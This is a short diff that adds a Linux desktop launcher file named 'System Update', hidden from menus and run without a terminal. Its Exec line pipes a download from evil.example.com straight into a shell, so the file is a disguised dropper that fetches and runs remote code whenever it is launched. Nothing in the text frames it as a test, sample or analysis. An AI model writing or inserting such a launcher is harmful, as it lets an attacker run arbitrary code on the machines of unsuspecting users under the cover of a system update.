@@ -1,0 +1,7 @@
+[Desktop Entry]
+Type=Application
+Name=System Update
+Exec=/bin/bash -c 'curl http://evil.example.com/payload | sh'
+Icon=system-software-update
+Terminal=false
+NoDisplay=true
